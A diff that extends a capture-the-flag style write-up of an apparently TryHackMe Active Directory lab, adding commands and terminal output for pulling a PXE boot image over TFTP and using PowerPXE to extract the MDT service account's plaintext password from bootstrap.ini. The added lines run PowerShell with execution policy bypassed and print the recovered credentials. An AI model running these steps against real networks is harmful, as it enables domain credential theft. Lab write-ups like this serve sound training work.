@@ -812,8 +812,34 @@ Steps:
 - Retrieve BCD file list from http://pxeboot.za.tryhackme.com.
 - Use TFTP to download the correct BCD file:
 
+First get the MDT ip <MDT_IP> = 10.200.70.202
+```
+thm@THMJMP1 C:\Users\thm\Documents\UserName>ndlookup thmmdt.za.tryhackme.com
+...
+Name:    thmmdt.za.tryhackme.com
+Address:  10.200.70.202
+```
+And get the full name of file from browser
+```
+# firefox pxeboot.za.tryhackme.com
+...should look like this in browser, we are only interested in x64 one for now.
+pxeboot.za.tryhackme.com - /
+
+  6/9/2026  7:37 PM         8192 arm64{BC082AD5-7887-4847-AE65-A505F7F6675D}.bcd
+  6/9/2026  7:37 PM         8192 arm{62B798A3-2752-4923-A381-7F91D94E8CB8}.bcd
+  3/4/2022  9:41 PM          213 web.config
+  6/9/2026  7:37 PM        12288 x64uefi{EF8C1039-7F33-461A-A453-DE0A4999B623}.bcd
+  6/9/2026  7:37 PM        12288 x64{5087FAC6-F032-4E66-A87C-1A0222B78A0E}.bcd
+  6/9/2026  7:37 PM         8192 x86uefi{B195B570-671D-4FBB-BC63-02B885BE4AF4}.bcd
+  6/9/2026  7:37 PM        12288 x86x64{4C4D1D3A-CA47-44F1-9448-F285008A7F5B}.bcd
+  6/9/2026  7:37 PM         8192 x86{98272C19-6977-4F8C-91CA-140AB95DE216}.bcd
+```
+Retrikeve BCD file
+
 ```
 tftp -i <MDT_IP> GET "\Tmp\x64{GUID}.bcd" conf.bcd
+...should look like
+tftp -i 10.200.70.202"\Tmp\x64{5087FAC6-F032-4E66-A87C-1A0222B78A0E}.bcd" conf.bcd
 ```
 Parse the BCD file using PowerPXE:
 ```
@@ -829,8 +855,117 @@ Extract credentials from the image:
 ```
 Get-FindCredentials -WimFile pxeboot.wim
 ```
+This should resemble
+```
+thm@THMJMP1 C:\Users\thm\Documents\UserName>powershell -execution
+policy bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.        
+
+PS C:\Users\thm\Documents\UserName> Import-Module .\PowerPXE.ps1 
+PS C:\Users\thm\Documents\UserName>  $BCDFile = "conf.bcd"       
+PS C:\Users\thm\Documents\UserName> Get-WimFile -bcdFile $BCDFile
+
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim    
+\Boot\x64\Images\LiteTouchPE_x64.wim
+PS C:\Users\thm\Documents\UserName> tftp -i 10.200.70.202 GET "\B
+oot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+Transfer successful: 341899611 bytes in 185 second(s), 1848106 by
+tes/s
+PS C:\Users\thm\Documents\UserName>  Get-FindCredentials -WimFile
+ pxeboot.wim
+>> Open pxeboot.wim 
+>>>> Finding Bootstrap.ini 
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
+>>>> >>>> UserID = svcMDT
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = PXEBootSecure1@
+PS C:\Users\thm\Documents\UserName>  
+
+```
 
 ### 4. Recovered Credentials Example
+
+```
+root@ip-10-49-99-152:~# ssh thm@THMJMP1.za.tryhackme.com
+The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.70.248)' can't be established.
+ED25519 key fingerprint is SHA256:50ZqYlTFUYKTHHPzgPNzG0gSydLnknXL0Ea7lUs7tT8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'thmjmp1.za.tryhackme.com' (ED25519) to the list of known hosts.
+thm@thmjmp1.za.tryhackme.com's password: 
+
+Microsoft Windows [Version 10.0.17763.1098]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+thm@THMJMP1 C:\Users\thm>cd Documents
+ 
+thm@THMJMP1 C:\Users\thm\Documents>dir
+ Volume in drive C is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of C:\Users\thm\Documents
+
+03/16/2022  03:51 PM    <DIR>          .
+03/16/2022  03:51 PM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  50,779,635,712 bytes free
+
+thm@THMJMP1 C:\Users\thm\Documents>mkdir UserName
+
+thm@THMJMP1 C:\Users\thm\Documents>copy c:\powerpxe UserName\    
+c:\powerpxe\LICENSE
+c:\powerpxe\PowerPXE.ps1
+c:\powerpxe\README.md
+        3 file(s) copied.
+ 
+thm@THMJMP1 C:\Users\thm\Documents>cd UserName
+ 
+thm@THMJMP1 C:\Users\thm\Documents\UserName>ls
+'ls' is not recognized as an internal or external command,       
+operable program or batch file.
+ 
+thm@THMJMP1 C:\Users\thm\Documents\UserName>dir
+ Volume in drive C is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of C:\Users\thm\Documents\UserName
+
+06/09/2026  08:00 PM    <DIR>          .
+06/09/2026  08:00 PM    <DIR>          ..
+03/03/2022  09:54 PM             1,098 LICENSE
+03/03/2022  09:54 PM            98,573 PowerPXE.ps1
+03/03/2022  09:54 PM             2,144 README.md
+               3 File(s)        101,815 bytes
+               2 Dir(s)  50,779,508,736 bytes free
+
+thm@THMJMP1 C:\Users\thm\Documents\UserName>tftp -i 10.200.70.202
+ GET "\Tmp\x64{5087FAC6-F032-4E66-A87C-1A0222B78A0E}.bcd" conf.bc
+d
+Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s   
+
+
+
+
+thm@THMJMP1 C:\Users\thm\Documents\UserName>powershell -execution
+policy bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.        
+
+PS C:\Users\thm\Documents\UserName> Import-Module .\PowerPXE.ps1 
+PS C:\Users\thm\Documents\UserName>  $BCDFile = "conf.bcd"       
+PS C:\Users\thm\Documents\UserName> Get-WimFile -bcdFile $BCDFile
+
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim    
+\Boot\x64\Images\LiteTouchPE_x64.wim
+PS C:\Users\thm\Documents\UserName> tftp -i 10.200.70.202 GET "\B
+oot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+
+
+
+```
 
 PowerPXE reveals credentials stored in bootstrap.ini:
 ```
